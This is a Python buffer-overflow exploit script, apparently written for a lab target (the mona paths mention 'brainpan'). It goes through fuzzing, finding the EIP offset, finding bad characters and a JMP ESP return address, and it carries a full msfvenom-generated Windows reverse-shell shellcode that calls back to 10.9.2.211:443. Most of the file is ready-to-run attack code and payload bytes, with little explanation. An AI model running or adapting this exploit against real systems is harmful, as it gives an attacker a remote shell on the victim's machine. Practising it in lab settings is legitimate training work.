import buff


target = ("10.10.39.66", 9999)
runner = buff.Buff(target = target, prefix = "", postfix = "\n")


"""
FIRST CREATE WOKRING DIRECTORY!!!
!mona config -set workingfolder c:\mona\%p
"""



# ----- 1. FUZZING -----
# Crashed at 600
# runner.fuzz()



# ----- 2. Send Unique Characters -----
# Set Buffer Size
BUFFER_SIZE = 1000
runner.setBufferSize(BUFFER_SIZE)

# runner.sendPattern()



# ----- 3. Find EIP Offset -----
"""
!mona findmsp -distance 1000
"""
# offset = buff.generator.findPatternOffset(BUFFER_SIZE, "386F4337")
# print(offset)

# Set Eip offset
EIP_OFFSET = 524
runner.setEipOffset(EIP_OFFSET)



# ----- 4. Find Bad Characters -----
"""
Possible: 23 24 3c 3d 83 84 ba

!mona bytearray -b "\x00"
!mona compare -f C:\mona\brainpan\bytearray.bin -a 0022F930
"""
# runner.sendBadChars(exclude = [])



# ----- 5. Send Exploit -----
"""
Find JMP ESP
!mona jmp -r esp -cpb "\x00"

Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.211 LPORT=443 EXITFUNC=thread -b "\x00" -a x86 -f c
"""

# Set return address (in reverse)
eip_address = "\xf3\x12\x17\x31"
runner.setEipAddress(eip_address)

exploit = (
    "\xbb\xda\x41\x78\xd9\xda\xc9\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
    "\x52\x31\x58\x12\x03\x58\x12\x83\x1a\x45\x9a\x2c\x66\xae\xd8"
    "\xcf\x96\x2f\xbd\x46\x73\x1e\xfd\x3d\xf0\x31\xcd\x36\x54\xbe"
    "\xa6\x1b\x4c\x35\xca\xb3\x63\xfe\x61\xe2\x4a\xff\xda\xd6\xcd"
    "\x83\x20\x0b\x2d\xbd\xea\x5e\x2c\xfa\x17\x92\x7c\x53\x53\x01"
    "\x90\xd0\x29\x9a\x1b\xaa\xbc\x9a\xf8\x7b\xbe\x8b\xaf\xf0\x99"
    "\x0b\x4e\xd4\x91\x05\x48\x39\x9f\xdc\xe3\x89\x6b\xdf\x25\xc0"
    "\x94\x4c\x08\xec\x66\x8c\x4d\xcb\x98\xfb\xa7\x2f\x24\xfc\x7c"
    "\x4d\xf2\x89\x66\xf5\x71\x29\x42\x07\x55\xac\x01\x0b\x12\xba"
    "\x4d\x08\xa5\x6f\xe6\x34\x2e\x8e\x28\xbd\x74\xb5\xec\xe5\x2f"
    "\xd4\xb5\x43\x81\xe9\xa5\x2b\x7e\x4c\xae\xc6\x6b\xfd\xed\x8e"
    "\x58\xcc\x0d\x4f\xf7\x47\x7e\x7d\x58\xfc\xe8\xcd\x11\xda\xef"
    "\x32\x08\x9a\x7f\xcd\xb3\xdb\x56\x0a\xe7\x8b\xc0\xbb\x88\x47"
    "\x10\x43\x5d\xc7\x40\xeb\x0e\xa8\x30\x4b\xff\x40\x5a\x44\x20"
    "\x70\x65\x8e\x49\x1b\x9c\x59\x7c\xd5\x9c\x4a\xe8\xe7\xa0\x6d"
    "\x52\x6e\x46\x07\xb4\x27\xd1\xb0\x2d\x62\xa9\x21\xb1\xb8\xd4"
    "\x62\x39\x4f\x29\x2c\xca\x3a\x39\xd9\x3a\x71\x63\x4c\x44\xaf"
    "\x0b\x12\xd7\x34\xcb\x5d\xc4\xe2\x9c\x0a\x3a\xfb\x48\xa7\x65"
    "\x55\x6e\x3a\xf3\x9e\x2a\xe1\xc0\x21\xb3\x64\x7c\x06\xa3\xb0"
    "\x7d\x02\x97\x6c\x28\xdc\x41\xcb\x82\xae\x3b\x85\x79\x79\xab"
    "\x50\xb2\xba\xad\x5c\x9f\x4c\x51\xec\x76\x09\x6e\xc1\x1e\x9d"
    "\x17\x3f\xbf\x62\xc2\xfb\xdf\x80\xc6\xf1\x77\x1d\x83\xbb\x15"
    "\x9e\x7e\xff\x23\x1d\x8a\x80\xd7\x3d\xff\x85\x9c\xf9\xec\xf7"
    "\x8d\x6f\x12\xab\xae\xa5"
)
runner.setExploit(exploit)

# set padding
runner.setPaddingSize(16)

# runner.sendExploit()
